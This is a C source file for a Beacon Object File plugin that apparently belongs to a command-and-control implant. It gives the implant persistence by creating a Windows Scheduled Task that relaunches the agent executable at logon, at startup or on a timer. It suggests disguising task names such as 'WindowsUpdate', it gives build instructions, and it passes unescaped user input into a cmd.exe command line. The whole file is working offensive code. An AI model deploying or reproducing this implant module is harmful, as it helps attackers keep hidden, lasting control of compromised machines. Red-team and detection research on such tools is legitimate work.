/*
 * schtask_persist.c - Scheduled Task persistence BOF plugin.
 *
 * Gets the current agent exe path, then creates a Windows Scheduled Task
 * to run it at a specified time/schedule.
 *
 * Args (single string via Beacon Data API):
 *   "<task_name> <schedule>"
 *
 *   task_name: the scheduled task name, e.g. "WindowsUpdate"
 *   schedule:  everything after the first space, passed to schtasks /SC
 *
 * Schedule examples:
 *   "WindowsUpdate ONLOGON"          - run at user logon
 *   "WindowsUpdate ONSTART"          - run at system startup
 *   "SysCheck MINUTE /MO 30"         - every 30 minutes
 *   "SysCheck HOURLY /MO 2"          - every 2 hours
 *   "DailySync DAILY /MO 1"          - every day
 *   "OneShot ONCE /ST 14:30"         - once at 14:30 today
 *
 * Output is converted from system codepage (ACP/GBK) to UTF-8.
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -c schtask_persist.c -o schtask_persist.o
 */

#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT BOOL  WINAPI KERNEL32$CreatePipe(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
DECLSPEC_IMPORT BOOL  WINAPI KERNEL32$CreateProcessA(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
DECLSPEC_IMPORT BOOL  WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL  WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
DECLSPEC_IMPORT BOOL  WINAPI KERNEL32$SetHandleInformation(HANDLE, DWORD, DWORD);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetModuleFileNameA(HMODULE, LPSTR, DWORD);
DECLSPEC_IMPORT int   WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);
DECLSPEC_IMPORT int   WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH, LPBOOL);

#define HANDLE_FLAG_INHERIT_VAL 0x00000001
#define CP_ACP_VAL   0
#define CP_UTF8_VAL  65001

static void bof_memset(void* dst, int val, unsigned long long n) {
    unsigned char* p = (unsigned char*)dst;
    while (n--) *p++ = (unsigned char)val;
}

static void bof_memcpy(void* dst, const void* src, unsigned long long n) {
    unsigned char* d = (unsigned char*)dst;
    const unsigned char* s = (const unsigned char*)src;
    while (n--) *d++ = *s++;
}

static int bof_strlen(const char* s) {
    int n = 0;
    while (s[n]) n++;
    return n;
}

static void output_acp_as_utf8(const char* acp_buf, int acp_len)
{
    if (acp_len <= 0) return;
    WCHAR wbuf[2048];
    int wlen = KERNEL32$MultiByteToWideChar(CP_ACP_VAL, 0, acp_buf, acp_len, wbuf, 2048);
    if (wlen <= 0) { BeaconOutput(CALLBACK_OUTPUT, (char*)acp_buf, acp_len); return; }
    char u8buf[8192];
    int u8len = KERNEL32$WideCharToMultiByte(CP_UTF8_VAL, 0, wbuf, wlen, u8buf, 8192, NULL, NULL);
    if (u8len <= 0) { BeaconOutput(CALLBACK_OUTPUT, (char*)acp_buf, acp_len); return; }
    BeaconOutput(CALLBACK_OUTPUT, u8buf, u8len);
}

static int run_cmd_output(const char* cmdline, int cmdline_len)
{
    HANDLE hReadPipe = NULL, hWritePipe = NULL;
    SECURITY_ATTRIBUTES sa;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char buf[4096];
    DWORD bytesRead;

    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;

    if (!KERNEL32$CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        BeaconOutput(CALLBACK_ERROR, "CreatePipe failed\n", 18);
        return 0;
    }
    KERNEL32$SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT_VAL, 0);

    bof_memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWritePipe;
    si.hStdError  = hWritePipe;
    si.hStdInput  = NULL;

    bof_memset(&pi, 0, sizeof(pi));

    char full[2048];
    const char* prefix = "cmd.exe /C ";
    int plen = bof_strlen(prefix);
    if (plen + cmdline_len >= (int)sizeof(full) - 1) {
        BeaconOutput(CALLBACK_ERROR, "Command too long\n", 17);
        KERNEL32$CloseHandle(hReadPipe);
        KERNEL32$CloseHandle(hWritePipe);
        return 0;
    }
    bof_memcpy(full, prefix, plen);
    bof_memcpy(full + plen, cmdline, cmdline_len);
    full[plen + cmdline_len] = '\0';

    if (!KERNEL32$CreateProcessA(NULL, full, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        BeaconOutput(CALLBACK_ERROR, "CreateProcess failed\n", 20);
        KERNEL32$CloseHandle(hReadPipe);
        KERNEL32$CloseHandle(hWritePipe);
        return 0;
    }

    KERNEL32$CloseHandle(hWritePipe);
    KERNEL32$WaitForSingleObject(pi.hProcess, 15000);

    while (KERNEL32$ReadFile(hReadPipe, buf, sizeof(buf) - 1, &bytesRead, NULL) && bytesRead > 0) {
        buf[bytesRead] = '\0';
        output_acp_as_utf8(buf, (int)bytesRead);
    }

    KERNEL32$CloseHandle(pi.hProcess);
    KERNEL32$CloseHandle(pi.hThread);
    KERNEL32$CloseHandle(hReadPipe);
    return 1;
}

void go(char* args, int alen)
{
    char* input = NULL;
    int input_len = 0;

    /* Parse single string arg: "<task_name> <schedule>" */
    if (args != NULL && alen >= 2) {
        datap parser;
        BeaconDataParse(&parser, args, alen);
        input = BeaconDataExtract(&parser, &input_len);
    }

    if (input == NULL || input_len <= 0) {
        BeaconOutput(CALLBACK_ERROR, "Usage: <task_name> <schedule>\nExample: WindowsUpdate ONLOGON\n", 61);
        return;
    }

    /* Null-terminate */
    char raw[512];
    if (input_len >= (int)sizeof(raw)) input_len = sizeof(raw) - 1;
    bof_memcpy(raw, input, input_len);
    raw[input_len] = '\0';

    /* Split at first space: task_name + schedule */
    char* space = NULL;
    int i;
    for (i = 0; i < input_len; i++) {
        if (raw[i] == ' ') { space = raw + i; break; }
    }

    if (space == NULL) {
        BeaconOutput(CALLBACK_ERROR, "Usage: <task_name> <schedule>\nExample: WindowsUpdate ONLOGON\n", 61);
        return;
    }

    *space = '\0';
    char* task_name = raw;
    int task_name_len = bof_strlen(task_name);

    char* schedule = space + 1;
    /* skip leading spaces */
    while (*schedule == ' ') schedule++;
    int schedule_len = bof_strlen(schedule);

    if (task_name_len == 0 || schedule_len == 0) {
        BeaconOutput(CALLBACK_ERROR, "Usage: <task_name> <schedule>\nExample: WindowsUpdate ONLOGON\n", 61);
        return;
    }

    /* Get current exe path */
    char exe_path[512];
    DWORD elen = KERNEL32$GetModuleFileNameA(NULL, exe_path, sizeof(exe_path));
    if (elen == 0 || elen >= sizeof(exe_path)) {
        BeaconOutput(CALLBACK_ERROR, "GetModuleFileName failed\n", 24);
        return;
    }
    exe_path[elen] = '\0';

    /* Report exe path */
    char info[768];
    int ipos = 0;
    const char* p1 = "EXE: ";
    int p1len = bof_strlen(p1);
    bof_memcpy(info + ipos, p1, p1len); ipos += p1len;
    bof_memcpy(info + ipos, exe_path, elen); ipos += elen;
    info[ipos++] = '\n';
    output_acp_as_utf8(info, ipos);

    /*
     * Build schtasks command:
     *   schtasks /Create /TN "<name>" /TR "<exe_path>" /SC <schedule> /F
     */
    char cmd[1536];
    int cpos = 0;

    const char* c1 = "schtasks /Create /TN \"";
    int c1len = bof_strlen(c1);
    bof_memcpy(cmd + cpos, c1, c1len); cpos += c1len;

    bof_memcpy(cmd + cpos, task_name, task_name_len); cpos += task_name_len;

    const char* c2 = "\" /TR \"";
    int c2len = bof_strlen(c2);
    bof_memcpy(cmd + cpos, c2, c2len); cpos += c2len;

    bof_memcpy(cmd + cpos, exe_path, elen); cpos += elen;

    const char* c3 = "\" /SC ";
    int c3len = bof_strlen(c3);
    bof_memcpy(cmd + cpos, c3, c3len); cpos += c3len;

    bof_memcpy(cmd + cpos, schedule, schedule_len); cpos += schedule_len;

    const char* c4 = " /F";
    int c4len = bof_strlen(c4);
    bof_memcpy(cmd + cpos, c4, c4len); cpos += c4len;

    cmd[cpos] = '\0';

    /* Report command being executed */
    char cmdinfo[1600];
    int ci = 0;
    const char* cp = "CMD: ";
    int cplen = bof_strlen(cp);
    bof_memcpy(cmdinfo + ci, cp, cplen); ci += cplen;
    bof_memcpy(cmdinfo + ci, cmd, cpos); ci += cpos;
    cmdinfo[ci++] = '\n';
    BeaconOutput(CALLBACK_OUTPUT, cmdinfo, ci);

    /* Execute schtasks */
    run_cmd_output(cmd, cpos);
}
